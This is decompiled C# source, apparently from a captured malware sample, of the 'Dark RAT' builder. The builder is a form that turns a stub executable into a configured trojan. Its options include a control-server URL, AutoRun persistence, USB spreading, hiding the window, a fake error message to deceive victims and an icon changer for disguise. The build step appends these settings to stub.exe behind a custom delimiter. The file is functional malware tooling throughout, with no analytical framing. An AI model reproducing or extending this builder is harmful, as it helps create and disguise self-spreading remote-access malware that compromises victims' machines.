// Decompiled with JetBrains decompiler
// Type: Dark_RAT.builder
// Assembly: Dark RAT, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3C824395-872F-43D5-A237-CC243F82B456
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-HackTool.MSIL.Flooder.gen-66512a2c31adfe77fb66c2c824e55509ba2cce70d158e850f0e56e3dc664f420.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace Dark_RAT
{
  [DesignerGenerated]
  public class builder : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("TextBox1")]
    private TextBox _TextBox1;
    [AccessedThroughProperty("CheckBox1")]
    private CheckBox _CheckBox1;
    [AccessedThroughProperty("CheckBox2")]
    private CheckBox _CheckBox2;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("CheckBox3")]
    private CheckBox _CheckBox3;
    [AccessedThroughProperty("TextBox2")]
    private TextBox _TextBox2;
    [AccessedThroughProperty("TextBox3")]
    private TextBox _TextBox3;
    [AccessedThroughProperty("CheckBox4")]
    private CheckBox _CheckBox4;
    [AccessedThroughProperty("CheckBox5")]
    private CheckBox _CheckBox5;
    [AccessedThroughProperty("CheckBox6")]
    private CheckBox _CheckBox6;
    [AccessedThroughProperty("CheckBox7")]
    private CheckBox _CheckBox7;
    [AccessedThroughProperty("PictureBox4")]
    private PictureBox _PictureBox4;
    [AccessedThroughProperty("PictureBox3")]
    private PictureBox _PictureBox3;
    [AccessedThroughProperty("PictureBox2")]
    private PictureBox _PictureBox2;
    [AccessedThroughProperty("PictureBox1")]
    private PictureBox _PictureBox1;
    [AccessedThroughProperty("TextBox4")]
    private TextBox _TextBox4;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Button2")]
    private Button _Button2;
    [AccessedThroughProperty("GroupBox1")]
    private GroupBox _GroupBox1;
    [AccessedThroughProperty("CheckBox8")]
    private CheckBox _CheckBox8;
    private string stub;
    private string text1;
    private string text2;
    private string text3;
    private string text4;
    private string text5;
    private string text6;
    private string text7;
    private string text8;
    private string text9;
    private string text10;
    private const string FileSplit = "@1906dark1996coder@";
    private string imagepath;

    [DebuggerNonUserCode]
    static builder()
    {
    }

    public builder()
    {
      this.Load += new EventHandler(this.builder_Load);
      builder.__ENCAddToList((object) this);
      this.imagepath = (string) null;
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (builder.__ENCList)
      {
        if (builder.__ENCList.Count == builder.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (builder.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (builder.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                builder.__ENCList[index1] = builder.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          builder.__ENCList.RemoveRange(index1, checked (builder.__ENCList.Count - index1));
          builder.__ENCList.Capacity = builder.__ENCList.Count;
        }
        builder.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (builder));
      this.TextBox1 = new TextBox();
      this.CheckBox1 = new CheckBox();
      this.CheckBox2 = new CheckBox();
      this.Button1 = new Button();
      this.CheckBox3 = new CheckBox();
      this.TextBox2 = new TextBox();
      this.TextBox3 = new TextBox();
      this.CheckBox4 = new CheckBox();
      this.CheckBox5 = new CheckBox();
      this.CheckBox6 = new CheckBox();
      this.CheckBox7 = new CheckBox();
      this.PictureBox4 = new PictureBox();
      this.PictureBox3 = new PictureBox();
      this.PictureBox2 = new PictureBox();
      this.PictureBox1 = new PictureBox();
      this.TextBox4 = new TextBox();
      this.Label1 = new Label();
      this.Button2 = new Button();
      this.GroupBox1 = new GroupBox();
      this.CheckBox8 = new CheckBox();
      ((ISupportInitialize) this.PictureBox4).BeginInit();
      ((ISupportInitialize) this.PictureBox3).BeginInit();
      ((ISupportInitialize) this.PictureBox2).BeginInit();
      ((ISupportInitialize) this.PictureBox1).BeginInit();
      this.GroupBox1.SuspendLayout();
      this.SuspendLayout();
      TextBox textBox1_1 = this.TextBox1;
      Point point1 = new Point(12, 12);
      Point point2 = point1;
      textBox1_1.Location = point2;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      Size size1 = new Size(245, 20);
      Size size2 = size1;
      textBox1_2.Size = size2;
      this.TextBox1.TabIndex = 0;
      this.TextBox1.Text = "http://127.0.0.1/rat/";
      this.CheckBox1.AutoSize = true;
      this.CheckBox1.BackColor = Color.Transparent;
      CheckBox checkBox1_1 = this.CheckBox1;
      point1 = new Point(12, 43);
      Point point3 = point1;
      checkBox1_1.Location = point3;
      this.CheckBox1.Name = "CheckBox1";
      CheckBox checkBox1_2 = this.CheckBox1;
      size1 = new Size(68, 17);
      Size size3 = size1;
      checkBox1_2.Size = size3;
      this.CheckBox1.TabIndex = 1;
      this.CheckBox1.Text = "AutoRun";
      this.CheckBox1.UseVisualStyleBackColor = false;
      this.CheckBox2.AutoSize = true;
      this.CheckBox2.BackColor = Color.Transparent;
      CheckBox checkBox2_1 = this.CheckBox2;
      point1 = new Point(12, 66);
      Point point4 = point1;
      checkBox2_1.Location = point4;
      this.CheckBox2.Name = "CheckBox2";
      CheckBox checkBox2_2 = this.CheckBox2;
      size1 = new Size(85, 17);
      Size size4 = size1;
      checkBox2_2.Size = size4;
      this.CheckBox2.TabIndex = 2;
      this.CheckBox2.Text = "USB Spread";
      this.CheckBox2.UseVisualStyleBackColor = false;
      this.Button1.Image = (Image) componentResourceManager.GetObject("Button1.Image");
      this.Button1.ImageAlign = ContentAlignment.MiddleLeft;
      Button button1_1 = this.Button1;
      point1 = new Point(12, 324);
      Point point5 = point1;
      button1_1.Location = point5;
      this.Button1.Name = "Button1";
      Button button1_2 = this.Button1;
      size1 = new Size(245, 23);
      Size size5 = size1;
      button1_2.Size = size5;
      this.Button1.TabIndex = 3;
      this.Button1.Text = "BUILD";
      this.Button1.UseVisualStyleBackColor = true;
      this.CheckBox3.AutoSize = true;
      this.CheckBox3.BackColor = Color.Transparent;
      CheckBox checkBox3_1 = this.CheckBox3;
      point1 = new Point(93, 43);
      Point point6 = point1;
      checkBox3_1.Location = point6;
      this.CheckBox3.Name = "CheckBox3";
      CheckBox checkBox3_2 = this.CheckBox3;
      size1 = new Size(74, 17);
      Size size6 = size1;
      checkBox3_2.Size = size6;
      this.CheckBox3.TabIndex = 4;
      this.CheckBox3.Text = "Hide Form";
      this.CheckBox3.UseVisualStyleBackColor = false;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(12, 122);
      Point point7 = point1;
      textBox2_1.Location = point7;
      this.TextBox2.Multiline = true;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(245, 45);
      Size size7 = size1;
      textBox2_2.Size = size7;
      this.TextBox2.TabIndex = 20;
      this.TextBox2.Text = "Failed to initialize properly \r\n(0xc0000142)";
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(12, 96);
      Point point8 = point1;
      textBox3_1.Location = point8;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(245, 20);
      Size size8 = size1;
      textBox3_2.Size = size8;
      this.TextBox3.TabIndex = 19;
      this.TextBox3.Text = "Error!";
      this.CheckBox4.AutoSize = true;
      this.CheckBox4.BackColor = Color.Transparent;
      CheckBox checkBox4_1 = this.CheckBox4;
      point1 = new Point(173, 199);
      Point point9 = point1;
      checkBox4_1.Location = point9;
      this.CheckBox4.Name = "CheckBox4";
      CheckBox checkBox4_2 = this.CheckBox4;
      size1 = new Size(57, 17);
      Size size9 = size1;
      checkBox4_2.Size = size9;
      this.CheckBox4.TabIndex = 18;
      this.CheckBox4.Text = "Critical";
      this.CheckBox4.UseVisualStyleBackColor = false;
      this.CheckBox5.AutoSize = true;
      this.CheckBox5.BackColor = Color.Transparent;
      CheckBox checkBox5_1 = this.CheckBox5;
      point1 = new Point(173, 174);
      Point point10 = point1;
      checkBox5_1.Location = point10;
      this.CheckBox5.Name = "CheckBox5";
      CheckBox checkBox5_2 = this.CheckBox5;
      size1 = new Size(68, 17);
      Size size10 = size1;
      checkBox5_2.Size = size10;
      this.CheckBox5.TabIndex = 17;
      this.CheckBox5.Text = "Question";
      this.CheckBox5.UseVisualStyleBackColor = false;
      this.CheckBox6.AutoSize = true;
      this.CheckBox6.BackColor = Color.Transparent;
      CheckBox checkBox6_1 = this.CheckBox6;
      point1 = new Point(47, 200);
      Point point11 = point1;
      checkBox6_1.Location = point11;
      this.CheckBox6.Name = "CheckBox6";
      CheckBox checkBox6_2 = this.CheckBox6;
      size1 = new Size(83, 17);
      Size size11 = size1;
      checkBox6_2.Size = size11;
      this.CheckBox6.TabIndex = 16;
      this.CheckBox6.Text = "Exclamation";
      this.CheckBox6.UseVisualStyleBackColor = false;
      this.CheckBox7.AutoSize = true;
      this.CheckBox7.BackColor = Color.Transparent;
      CheckBox checkBox7_1 = this.CheckBox7;
      point1 = new Point(47, 173);
      Point point12 = point1;
      checkBox7_1.Location = point12;
      this.CheckBox7.Name = "CheckBox7";
      CheckBox checkBox7_2 = this.CheckBox7;
      size1 = new Size(78, 17);
      Size size12 = size1;
      checkBox7_2.Size = size12;
      this.CheckBox7.TabIndex = 15;
      this.CheckBox7.Text = "Information";
      this.CheckBox7.UseVisualStyleBackColor = false;
      this.PictureBox4.BackColor = Color.Transparent;
      this.PictureBox4.Image = (Image) componentResourceManager.GetObject("PictureBox4.Image");
      PictureBox pictureBox4_1 = this.PictureBox4;
      point1 = new Point(148, 171);
      Point point13 = point1;
      pictureBox4_1.Location = point13;
      this.PictureBox4.Name = "PictureBox4";
      PictureBox pictureBox4_2 = this.PictureBox4;
      size1 = new Size(19, 19);
      Size size13 = size1;
      pictureBox4_2.Size = size13;
      this.PictureBox4.TabIndex = 14;
      this.PictureBox4.TabStop = false;
      this.PictureBox3.BackColor = Color.Transparent;
      this.PictureBox3.Image = (Image) componentResourceManager.GetObject("PictureBox3.Image");
      PictureBox pictureBox3_1 = this.PictureBox3;
      point1 = new Point(148, 196);
      Point point14 = point1;
      pictureBox3_1.Location = point14;
      this.PictureBox3.Name = "PictureBox3";
      PictureBox pictureBox3_2 = this.PictureBox3;
      size1 = new Size(19, 19);
      Size size14 = size1;
      pictureBox3_2.Size = size14;
      this.PictureBox3.TabIndex = 13;
      this.PictureBox3.TabStop = false;
      this.PictureBox2.BackColor = Color.Transparent;
      this.PictureBox2.Image = (Image) componentResourceManager.GetObject("PictureBox2.Image");
      PictureBox pictureBox2_1 = this.PictureBox2;
      point1 = new Point(22, 172);
      Point point15 = point1;
      pictureBox2_1.Location = point15;
      this.PictureBox2.Name = "PictureBox2";
      PictureBox pictureBox2_2 = this.PictureBox2;
      size1 = new Size(19, 19);
      Size size15 = size1;
      pictureBox2_2.Size = size15;
      this.PictureBox2.TabIndex = 12;
      this.PictureBox2.TabStop = false;
      this.PictureBox1.BackColor = Color.Transparent;
      this.PictureBox1.Image = (Image) componentResourceManager.GetObject("PictureBox1.Image");
      PictureBox pictureBox1_1 = this.PictureBox1;
      point1 = new Point(22, 197);
      Point point16 = point1;
      pictureBox1_1.Location = point16;
      this.PictureBox1.Name = "PictureBox1";
      PictureBox pictureBox1_2 = this.PictureBox1;
      size1 = new Size(19, 19);
      Size size16 = size1;
      pictureBox1_2.Size = size16;
      this.PictureBox1.TabIndex = 11;
      this.PictureBox1.TabStop = false;
      TextBox textBox4_1 = this.TextBox4;
      point1 = new Point(103, 237);
      Point point17 = point1;
      textBox4_1.Location = point17;
      this.TextBox4.Name = "TextBox4";
      TextBox textBox4_2 = this.TextBox4;
      size1 = new Size(154, 20);
      Size size17 = size1;
      textBox4_2.Size = size17;
      this.TextBox4.TabIndex = 21;
      this.TextBox4.Text = "1000";
      this.Label1.AutoSize = true;
      this.Label1.BackColor = Color.Transparent;
      this.Label1.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 238);
      Label label1_1 = this.Label1;
      point1 = new Point(12, 241);
      Point point18 = point1;
      label1_1.Location = point18;
      this.Label1.Name = "Label1";
      Label label1_2 = this.Label1;
      size1 = new Size(85, 13);
      Size size18 = size1;
      label1_2.Size = size18;
      this.Label1.TabIndex = 22;
      this.Label1.Text = "Timer Interval";
      this.Button2.Enabled = false;
      Button button2_1 = this.Button2;
      point1 = new Point(16, 19);
      Point point19 = point1;
      button2_1.Location = point19;
      this.Button2.Name = "Button2";
      Button button2_2 = this.Button2;
      size1 = new Size(167, 23);
      Size size19 = size1;
      button2_2.Size = size19;
      this.Button2.TabIndex = 24;
      this.Button2.Text = "Upload";
      this.Button2.UseVisualStyleBackColor = true;
      this.GroupBox1.BackColor = Color.Transparent;
      this.GroupBox1.Controls.Add((Control) this.Button2);
      GroupBox groupBox1_1 = this.GroupBox1;
      point1 = new Point(37, 263);
      Point point20 = point1;
      groupBox1_1.Location = point20;
      this.GroupBox1.Name = "GroupBox1";
      GroupBox groupBox1_2 = this.GroupBox1;
      size1 = new Size(196, 55);
      Size size20 = size1;
      groupBox1_2.Size = size20;
      this.GroupBox1.TabIndex = 26;
      this.GroupBox1.TabStop = false;
      this.GroupBox1.Text = "Icon changer";
      this.CheckBox8.AutoSize = true;
      this.CheckBox8.BackColor = Color.Transparent;
      CheckBox checkBox8_1 = this.CheckBox8;
      point1 = new Point(93, 66);
      Point point21 = point1;
      checkBox8_1.Location = point21;
      this.CheckBox8.Name = "CheckBox8";
      CheckBox checkBox8_2 = this.CheckBox8;
      size1 = new Size(90, 17);
      Size size21 = size1;
      checkBox8_2.Size = size21;
      this.CheckBox8.TabIndex = 27;
      this.CheckBox8.Text = "Icon Changer";
      this.CheckBox8.UseVisualStyleBackColor = false;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackgroundImage = (Image) componentResourceManager.GetObject("$this.BackgroundImage");
      size1 = new Size(269, 359);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.CheckBox8);
      this.Controls.Add((Control) this.GroupBox1);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.TextBox4);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.CheckBox4);
      this.Controls.Add((Control) this.CheckBox5);
      this.Controls.Add((Control) this.CheckBox6);
      this.Controls.Add((Control) this.CheckBox7);
      this.Controls.Add((Control) this.PictureBox4);
      this.Controls.Add((Control) this.PictureBox3);
      this.Controls.Add((Control) this.PictureBox2);
      this.Controls.Add((Control) this.PictureBox1);
      this.Controls.Add((Control) this.CheckBox3);
      this.Controls.Add((Control) this.Button1);
      this.Controls.Add((Control) this.CheckBox2);
      this.Controls.Add((Control) this.CheckBox1);
      this.Controls.Add((Control) this.TextBox1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.MaximizeBox = false;
      this.Name = nameof (builder);
      this.Text = "DarkRAT - Builder";
      ((ISupportInitialize) this.PictureBox4).EndInit();
      ((ISupportInitialize) this.PictureBox3).EndInit();
      ((ISupportInitialize) this.PictureBox2).EndInit();
      ((ISupportInitialize) this.PictureBox1).EndInit();
      this.GroupBox1.ResumeLayout(false);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this._TextBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox1 = value;
    }

    internal virtual CheckBox CheckBox1
    {
      [DebuggerNonUserCode] get => this._CheckBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox1 = value;
    }

    internal virtual CheckBox CheckBox2
    {
      [DebuggerNonUserCode] get => this._CheckBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox2 = value;
    }

    internal virtual Button Button1
    {
      [DebuggerNonUserCode] get => this._Button1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    internal virtual CheckBox CheckBox3
    {
      [DebuggerNonUserCode] get => this._CheckBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox3 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this._TextBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox2 = value;
    }

    internal virtual TextBox TextBox3
    {
      [DebuggerNonUserCode] get => this._TextBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox3 = value;
    }

    internal virtual CheckBox CheckBox4
    {
      [DebuggerNonUserCode] get => this._CheckBox4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckBox4_CheckedChanged);
        if (this._CheckBox4 != null)
          this._CheckBox4.CheckedChanged -= eventHandler;
        this._CheckBox4 = value;
        if (this._CheckBox4 == null)
          return;
        this._CheckBox4.CheckedChanged += eventHandler;
      }
    }

    internal virtual CheckBox CheckBox5
    {
      [DebuggerNonUserCode] get => this._CheckBox5;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckBox5_CheckedChanged);
        if (this._CheckBox5 != null)
          this._CheckBox5.CheckedChanged -= eventHandler;
        this._CheckBox5 = value;
        if (this._CheckBox5 == null)
          return;
        this._CheckBox5.CheckedChanged += eventHandler;
      }
    }

    internal virtual CheckBox CheckBox6
    {
      [DebuggerNonUserCode] get => this._CheckBox6;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckBox6_CheckedChanged);
        if (this._CheckBox6 != null)
          this._CheckBox6.CheckedChanged -= eventHandler;
        this._CheckBox6 = value;
        if (this._CheckBox6 == null)
          return;
        this._CheckBox6.CheckedChanged += eventHandler;
      }
    }

    internal virtual CheckBox CheckBox7
    {
      [DebuggerNonUserCode] get => this._CheckBox7;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckBox7_CheckedChanged);
        if (this._CheckBox7 != null)
          this._CheckBox7.CheckedChanged -= eventHandler;
        this._CheckBox7 = value;
        if (this._CheckBox7 == null)
          return;
        this._CheckBox7.CheckedChanged += eventHandler;
      }
    }

    internal virtual PictureBox PictureBox4
    {
      [DebuggerNonUserCode] get => this._PictureBox4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox4 = value;
    }

    internal virtual PictureBox PictureBox3
    {
      [DebuggerNonUserCode] get => this._PictureBox3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox3 = value;
    }

    internal virtual PictureBox PictureBox2
    {
      [DebuggerNonUserCode] get => this._PictureBox2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox2 = value;
    }

    internal virtual PictureBox PictureBox1
    {
      [DebuggerNonUserCode] get => this._PictureBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._PictureBox1 = value;
    }

    internal virtual TextBox TextBox4
    {
      [DebuggerNonUserCode] get => this._TextBox4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._TextBox4 = value;
    }

    internal virtual Label Label1
    {
      [DebuggerNonUserCode] get => this._Label1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Button Button2
    {
      [DebuggerNonUserCode] get => this._Button2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button2_Click);
        if (this._Button2 != null)
          this._Button2.Click -= eventHandler;
        this._Button2 = value;
        if (this._Button2 == null)
          return;
        this._Button2.Click += eventHandler;
      }
    }

    internal virtual GroupBox GroupBox1
    {
      [DebuggerNonUserCode] get => this._GroupBox1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._GroupBox1 = value;
    }

    internal virtual CheckBox CheckBox8
    {
      [DebuggerNonUserCode] get => this._CheckBox8;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CheckBox8_CheckedChanged_1);
        if (this._CheckBox8 != null)
          this._CheckBox8.CheckedChanged -= eventHandler;
        this._CheckBox8 = value;
        if (this._CheckBox8 == null)
          return;
        this._CheckBox8.CheckedChanged += eventHandler;
      }
    }

    private void builder_Load(object sender, EventArgs e)
    {
    }

    private void IconIt(string SourceIcon, string File) => Interaction.Shell(Application.StartupPath + "/other/icon/res.exe -addoverwrite " + File + ", " + File + ", " + SourceIcon + ", icongroup, 1,0");

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Button1_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
      saveFileDialog.Title = "Dark RAT Builder";
      saveFileDialog.Filter = "EXE Files (*.exe)|*.exe";
      int num1 = (int) saveFileDialog.ShowDialog();
      if (Operators.CompareString(saveFileDialog.FileName, "", false) == 0)
        return;
      this.text1 = this.TextBox1.Text;
      this.text2 = "0";
      this.text3 = "0";
      this.text4 = "0";
      if (this.CheckBox1.Checked)
        this.text2 = "1";
      if (this.CheckBox2.Checked)
        this.text3 = "1";
      if (this.CheckBox3.Checked)
        this.text4 = "1";
      this.text5 = "0";
      if (this.CheckBox4.Checked)
        this.text5 = "1";
      if (this.CheckBox5.Checked)
        this.text5 = "2";
      if (this.CheckBox6.Checked)
        this.text5 = "3";
      if (this.CheckBox7.Checked)
        this.text5 = "4";
      this.text6 = this.TextBox2.Text;
      this.text7 = this.TextBox3.Text;
      this.text8 = this.TextBox4.Text;
      FileSystem.FileOpen(1, Application.StartupPath + "\\stub.exe", OpenMode.Binary, OpenAccess.Read);
      this.stub = Strings.Space(checked ((int) FileSystem.LOF(1)));
      FileSystem.FileGet(1, ref this.stub);
      FileSystem.FileClose(1);
      FileSystem.FileOpen(1, saveFileDialog.FileName, OpenMode.Binary, OpenAccess.ReadWrite);
      FileSystem.FilePut(1, this.stub + "@1906dark1996coder@" + this.text1 + "@1906dark1996coder@" + this.text2 + "@1906dark1996coder@" + this.text3 + "@1906dark1996coder@" + this.text4 + "@1906dark1996coder@" + this.text5 + "@1906dark1996coder@" + this.text6 + "@1906dark1996coder@" + this.text7 + "@1906dark1996coder@" + this.text8 + "@1906dark1996coder@" + this.text9 + "@1906dark1996coder@" + this.text10 + "@1906dark1996coder@", -1L, false);
      FileSystem.FileClose(1);
      if (this.CheckBox8.Checked)
        this.IconIt(this.imagepath, saveFileDialog.FileName);
      int num2 = (int) Interaction.MsgBox((object) "Sucesseful!");
    }

    private void CheckBox7_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.CheckBox7.Checked)
        return;
      this.CheckBox6.Checked = false;
      this.CheckBox5.Checked = false;
      this.CheckBox4.Checked = false;
    }

    private void CheckBox5_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.CheckBox5.Checked)
        return;
      this.CheckBox6.Checked = false;
      this.CheckBox7.Checked = false;
      this.CheckBox4.Checked = false;
    }

    private void CheckBox6_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.CheckBox6.Checked)
        return;
      this.CheckBox7.Checked = false;
      this.CheckBox5.Checked = false;
      this.CheckBox4.Checked = false;
    }

    private void CheckBox4_CheckedChanged(object sender, EventArgs e)
    {
      if (!this.CheckBox4.Checked)
        return;
      this.CheckBox6.Checked = false;
      this.CheckBox5.Checked = false;
      this.CheckBox7.Checked = false;
    }

    private void CheckBox8_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void CheckBox9_CheckedChanged(object sender, EventArgs e)
    {
    }

    private void TextBox5_TextChanged(object sender, EventArgs e)
    {
    }

    private void Button2_Click(object sender, EventArgs e)
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.Title = "Select ICON";
      openFileDialog.Filter = "ICO Files (*.ico)|*.ico";
      int num = (int) openFileDialog.ShowDialog();
      if (Operators.CompareString(openFileDialog.FileName, "", false) == 0)
        return;
      this.imagepath = openFileDialog.FileName;
    }

    private void Button3_Click(object sender, EventArgs e)
    {
    }

    private void CheckBox8_CheckedChanged_1(object sender, EventArgs e)
    {
      if (this.CheckBox8.Checked)
        this.Button2.Enabled = true;
      else
        this.Button2.Enabled = false;
    }
  }
}
